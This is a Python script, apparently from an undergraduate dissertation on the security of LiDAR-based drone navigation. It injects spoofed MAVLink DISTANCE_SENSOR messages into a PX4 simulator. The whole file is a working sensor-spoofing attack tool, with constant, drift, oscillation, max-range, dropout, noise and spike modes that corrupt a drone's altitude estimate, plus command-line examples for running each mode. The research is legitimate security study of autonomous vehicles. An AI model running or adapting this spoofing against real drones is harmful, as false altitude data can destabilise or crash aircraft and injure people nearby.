#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
lidar_injector.py
=================

LiDAR DISTANCE_SENSOR MAVLink injection tool for PX4 SITL.

This script is part of the toolkit supporting the dissertation
"Hacking Non-GPS/GPS-denied Drones: Security Analysis of LiDAR-based
UAV Navigation" (author: CS final-year student, April 2026).

The tool opens a MAVLink endpoint that PX4 SITL treats as a companion
computer / onboard API (default: udpout:127.0.0.1:14580) and streams
synthetic DISTANCE_SENSOR messages imitating a Garmin LiDAR-Lite v3
downward rangefinder.  Each attack mode recreates (in software) a
physical failure mode that was empirically characterised during the
surface-testing phase of the dissertation experiments:

    normal      -> honest baseline readings (establishes EKF2 lock)
    constant    -> fixed spoofed distance (constant-ground illusion)
    drift       -> slow monotonic drift (stealthy altitude corruption)
    oscillation -> sinusoidal oscillation (altitude-hold destabilisation)
    max_range   -> saturated-at-max (recreates specular/mirror return)
    dropout     -> quality=0 / invalid (recreates transparent surface
                   signal loss)
    noisy       -> large gaussian noise (recreates noisy reflective
                   surface returns)
    spike       -> intermittent 40m/0m spikes over otherwise normal
                   readings (mixed transient attack)

Every transmitted sample is logged to a CSV for later analysis by
analyze_log.py.

NOTE:  The script does **not** start or stop the simulator.  It
assumes PX4 SITL (jMAVSim / Gazebo) is already running and that the
vehicle has booted far enough to be accepting MAVLink on port 14580.

Author : dissertation student
Target : PX4 v1.14+ SITL
Sensor : Garmin LiDAR-Lite v3  (min 5 cm, max 4000 cm, type=0 laser,
                                orientation=25  PITCH_270 = downward)
"""

from __future__ import annotations

import argparse
import csv
import math
import os
import random
import signal
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Optional

os.environ.setdefault("MAVLINK20", "1")
os.environ.setdefault("MAVLINK_DIALECT", "common")

try:
    from pymavlink import mavutil
except ImportError:
    sys.stderr.write(
        "\033[91m[FATAL]\033[0m pymavlink is not installed.\n"
        "       Install with:  pip install -r requirements.txt\n"
    )
    sys.exit(1)


class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    M = "\033[95m"
    CY = "\033[96m"
    W = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    END = "\033[0m"


def _banner(mode: str, duration: float, rate_hz: float, endpoint: str) -> None:
    print(f"{C.CY}{C.BOLD}" + "=" * 72 + f"{C.END}")
    print(f"{C.CY}{C.BOLD}  PX4 SITL LiDAR Injection Attack Toolkit{C.END}")
    print(f"{C.CY}{C.BOLD}" + "=" * 72 + f"{C.END}")
    print(f"  {C.W}mode     :{C.END} {C.Y}{mode}{C.END}")
    print(f"  {C.W}duration :{C.END} {duration:.1f} s")
    print(f"  {C.W}rate     :{C.END} {rate_hz:.1f} Hz")
    print(f"  {C.W}endpoint :{C.END} {endpoint}")
    print(f"  {C.W}sensor   :{C.END} Garmin LiDAR-Lite v3 "
          "(5 cm – 40 m, type=0 laser, orientation=25 down)")
    print(f"{C.CY}" + "-" * 72 + f"{C.END}")


MIN_DISTANCE_CM = 5
MAX_DISTANCE_CM = 4000
SENSOR_TYPE = 0
SENSOR_ID = 0
SENSOR_ORIENTATION = 25
COVARIANCE_DEFAULT = 1
COVARIANCE_INVALID = 255

SPOOF_SYSID = 1
SPOOF_COMPID = 191


@dataclass
class AttackParams:
    true_altitude_m: float = 2.5
    constant_value_m: float = 0.5
    drift_rate_mps: float = 0.05
    osc_amp_m: float = 1.5
    osc_period_s: float = 2.0
    noise_sigma_m: float = 0.5
    spike_prob: float = 0.05
    seed: Optional[int] = None


Generator = Callable[[float, AttackParams], tuple[int, int]]


def _clamp_cm(value_cm: float) -> int:
    v = int(round(value_cm))
    if v < MIN_DISTANCE_CM:
        v = MIN_DISTANCE_CM
    if v > MAX_DISTANCE_CM:
        v = MAX_DISTANCE_CM
    return v


def gen_normal(t: float, p: AttackParams) -> tuple[int, int]:
    noise = random.gauss(0.0, 0.01)
    d_m = p.true_altitude_m + noise
    return _clamp_cm(d_m * 100.0), 100


def gen_constant(t: float, p: AttackParams) -> tuple[int, int]:
    return _clamp_cm(p.constant_value_m * 100.0), 100


def gen_drift(t: float, p: AttackParams) -> tuple[int, int]:
    d_m = p.true_altitude_m + p.drift_rate_mps * t
    return _clamp_cm(d_m * 100.0), 100


def gen_oscillation(t: float, p: AttackParams) -> tuple[int, int]:
    d_m = p.true_altitude_m + p.osc_amp_m * math.sin(
        2.0 * math.pi * t / p.osc_period_s
    )
    return _clamp_cm(d_m * 100.0), 100


def gen_max_range(t: float, p: AttackParams) -> tuple[int, int]:
    return MAX_DISTANCE_CM, 100


def gen_dropout(t: float, p: AttackParams) -> tuple[int, int]:
    return 0, 0


def gen_noisy(t: float, p: AttackParams) -> tuple[int, int]:
    d_m = p.true_altitude_m + random.gauss(0.0, p.noise_sigma_m)
    return _clamp_cm(max(0.05, d_m) * 100.0), 100


def gen_spike(t: float, p: AttackParams) -> tuple[int, int]:
    if random.random() < p.spike_prob:
        if random.random() < 0.5:
            return MAX_DISTANCE_CM, 100
        return 0, 0
    return gen_normal(t, p)


MODE_TABLE: dict[str, Generator] = {
    "normal":       gen_normal,
    "constant":     gen_constant,
    "drift":        gen_drift,
    "oscillation":  gen_oscillation,
    "max_range":    gen_max_range,
    "dropout":      gen_dropout,
    "noisy":        gen_noisy,
    "spike":        gen_spike,
}


class LidarInjector:
    def __init__(
        self,
        endpoint: str,
        mode: str,
        rate_hz: float,
        duration: float,
        params: AttackParams,
        log_path: Optional[Path] = None,
    ) -> None:
        if mode not in MODE_TABLE:
            raise ValueError(
                f"Unknown mode '{mode}'. Choose from: {list(MODE_TABLE)}"
            )
        self.endpoint = endpoint
        self.mode = mode
        self.rate_hz = float(rate_hz)
        self.period = 1.0 / self.rate_hz
        self.duration = float(duration)
        self.params = params
        self.generator: Generator = MODE_TABLE[mode]
        self._stop = False
        self._master: Optional[mavutil.mavfile] = None

        if log_path is None:
            log_dir = Path(__file__).resolve().parent / "logs"
            log_dir.mkdir(parents=True, exist_ok=True)
            stamp = time.strftime("%Y%m%d_%H%M%S")
            log_path = log_dir / f"injector_{stamp}_{mode}.csv"
        self.log_path = Path(log_path)
        self._log_fh = self.log_path.open("w", newline="")
        self._log = csv.writer(self._log_fh)
        self._log.writerow([
            "wall_time_iso",
            "monotonic_s",
            "t_elapsed_s",
            "mode",
            "distance_cm",
            "distance_m",
            "signal_quality",
            "covariance",
            "min_cm",
            "max_cm",
        ])

    def _connect(self) -> None:
        print(f"{C.B}[*]{C.END} opening MAVLink endpoint {self.endpoint} …")
        self._master = mavutil.mavlink_connection(
            self.endpoint,
            source_system=SPOOF_SYSID,
            source_component=SPOOF_COMPID,
            input=False,
        )
        print(f"{C.G}[+]{C.END} MAVLink connection opened "
              f"(sysid={SPOOF_SYSID}, compid={SPOOF_COMPID}).")

    def _send_one(self, t_elapsed: float) -> tuple[int, int, int]:
        distance_cm, quality = self.generator(t_elapsed, self.params)
        covariance = (
            COVARIANCE_INVALID if quality == 0 else COVARIANCE_DEFAULT
        )
        assert self._master is not None
        time_boot_ms = int(t_elapsed * 1000.0) & 0xFFFFFFFF

        try:
            self._master.mav.distance_sensor_send(
                time_boot_ms,
                MIN_DISTANCE_CM,
                MAX_DISTANCE_CM,
                distance_cm,
                SENSOR_TYPE,
                SENSOR_ID,
                SENSOR_ORIENTATION,
                covariance,
                horizontal_fov=0.0,
                vertical_fov=0.0,
                quaternion=[0.0, 0.0, 0.0, 0.0],
                signal_quality=quality,
            )
        except TypeError:
            if not getattr(self, "_warned_extended", False):
                print(f"{C.Y}[!]{C.END} pymavlink build lacks extended "
                      "DISTANCE_SENSOR fields — falling back to legacy "
                      "signature (signal_quality will not be "
                      "transmitted).")
                self._warned_extended = True
            self._master.mav.distance_sensor_send(
                time_boot_ms,
                MIN_DISTANCE_CM,
                MAX_DISTANCE_CM,
                distance_cm,
                SENSOR_TYPE,
                SENSOR_ID,
                SENSOR_ORIENTATION,
                covariance,
            )
        return distance_cm, quality, covariance

    def run(self) -> None:
        self._connect()

        signal.signal(signal.SIGINT, self._on_signal)
        signal.signal(signal.SIGTERM, self._on_signal)

        start_mono = time.monotonic()
        next_tick = start_mono
        sample_count = 0
        print(f"{C.M}[>] injecting '{self.mode}' @ {self.rate_hz:.1f} Hz "
              f"for {self.duration:.1f}s … "
              f"(Ctrl+C to abort){C.END}")
        last_print = start_mono

        try:
            while not self._stop:
                now = time.monotonic()
                t_elapsed = now - start_mono
                if t_elapsed >= self.duration:
                    break

                distance_cm, quality, covariance = self._send_one(t_elapsed)

                self._log.writerow([
                    time.strftime("%Y-%m-%dT%H:%M:%S",
                                  time.localtime()) +
                    f".{int((time.time() % 1) * 1e6):06d}",
                    f"{now:.6f}",
                    f"{t_elapsed:.6f}",
                    self.mode,
                    distance_cm,
                    f"{distance_cm / 100.0:.4f}",
                    quality,
                    covariance,
                    MIN_DISTANCE_CM,
                    MAX_DISTANCE_CM,
                ])
                sample_count += 1

                if now - last_print >= 1.0:
                    last_print = now
                    print(
                        f"  {C.DIM}t={t_elapsed:6.2f}s{C.END}  "
                        f"{C.Y}{self.mode:<11}{C.END}  "
                        f"dist={C.W}{distance_cm/100.0:6.2f} m{C.END}  "
                        f"q={quality:>3d}  "
                        f"sent={sample_count}"
                    )

                next_tick += self.period
                delay = next_tick - time.monotonic()
                if delay > 0:
                    time.sleep(delay)
                else:
                    next_tick = time.monotonic()
        finally:
            self._shutdown(sample_count, time.monotonic() - start_mono)

    def _on_signal(self, signum, _frame):
        print(f"\n{C.Y}[!]{C.END} signal {signum} received — stopping.")
        self._stop = True

    def _shutdown(self, samples: int, elapsed: float) -> None:
        try:
            self._log_fh.flush()
            self._log_fh.close()
        except Exception:
            pass
        try:
            if self._master is not None:
                self._master.close()
        except Exception:
            pass
        rate = samples / elapsed if elapsed > 0 else 0.0
        print(f"{C.G}[✓]{C.END} injection finished: "
              f"{samples} samples in {elapsed:.2f}s "
              f"({rate:.1f} Hz effective)")
        print(f"{C.G}[✓]{C.END} log written to {self.log_path}")


def _parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="lidar_injector",
        description=(
            "Inject spoofed DISTANCE_SENSOR MAVLink messages into PX4 "
            "SITL. Each --mode corresponds to a physical LiDAR "
            "vulnerability observed during the dissertation's "
            "hardware surface-testing phase."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  # baseline — establish EKF2 rangefinder lock\n"
            "  ./lidar_injector.py --mode normal --duration 30\n\n"
            "  # mirror / max-range saturation attack (40m)\n"
            "  ./lidar_injector.py --mode max_range --duration 30\n\n"
            "  # transparent-surface dropout for 60 s\n"
            "  ./lidar_injector.py --mode dropout --duration 60\n\n"
            "  # stealthy +10 cm/s drift\n"
            "  ./lidar_injector.py --mode drift --drift-rate 0.1 --duration 60\n"
        ),
    )
    parser.add_argument(
        "--mode", required=True, choices=list(MODE_TABLE),
        help="Attack mode to run.",
    )
    parser.add_argument(
        "--duration", type=float, default=30.0,
        help="Run duration in seconds (default: 30).",
    )
    parser.add_argument(
        "--rate", type=float, default=50.0,
        help="Publication rate in Hz (default: 50).",
    )
    parser.add_argument(
        "--endpoint", default="udpout:127.0.0.1:14580",
        help="pymavlink endpoint (default: udpout:127.0.0.1:14580).",
    )
    parser.add_argument(
        "--log", default=None,
        help="CSV log path (default: ./logs/injector_<ts>_<mode>.csv).",
    )

    parser.add_argument(
        "--true-alt", type=float, default=2.5,
        help="Assumed true hover altitude in metres (default: 2.5).",
    )
    parser.add_argument(
        "--constant-value", type=float, default=0.5,
        help="Fixed distance for --mode constant, metres (default: 0.5).",
    )
    parser.add_argument(
        "--drift-rate", type=float, default=0.05,
        help="Drift rate for --mode drift, m/s. Negative = descend "
             "(default: 0.05).",
    )
    parser.add_argument(
        "--osc-amp", type=float, default=1.5,
        help="Oscillation amplitude for --mode oscillation, m (default: 1.5).",
    )
    parser.add_argument(
        "--osc-period", type=float, default=2.0,
        help="Oscillation period for --mode oscillation, s (default: 2.0).",
    )
    parser.add_argument(
        "--noise-sigma", type=float, default=0.5,
        help="Gaussian sigma for --mode noisy, m (default: 0.5).",
    )
    parser.add_argument(
        "--spike-prob", type=float, default=0.05,
        help="Per-sample spike probability for --mode spike (default: 0.05).",
    )
    parser.add_argument(
        "--seed", type=int, default=None,
        help="Random seed for reproducibility.",
    )
    return parser.parse_args(argv)


def main(argv: Optional[list[str]] = None) -> int:
    args = _parse_args(argv)

    if args.seed is not None:
        random.seed(args.seed)

    params = AttackParams(
        true_altitude_m=args.true_alt,
        constant_value_m=args.constant_value,
        drift_rate_mps=args.drift_rate,
        osc_amp_m=args.osc_amp,
        osc_period_s=args.osc_period,
        noise_sigma_m=args.noise_sigma,
        spike_prob=args.spike_prob,
        seed=args.seed,
    )

    _banner(args.mode, args.duration, args.rate, args.endpoint)

    injector = LidarInjector(
        endpoint=args.endpoint,
        mode=args.mode,
        rate_hz=args.rate,
        duration=args.duration,
        params=params,
        log_path=Path(args.log) if args.log else None,
    )
    try:
        injector.run()
    except Exception as exc:
        print(f"{C.R}[FATAL]{C.END} {type(exc).__name__}: {exc}")
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
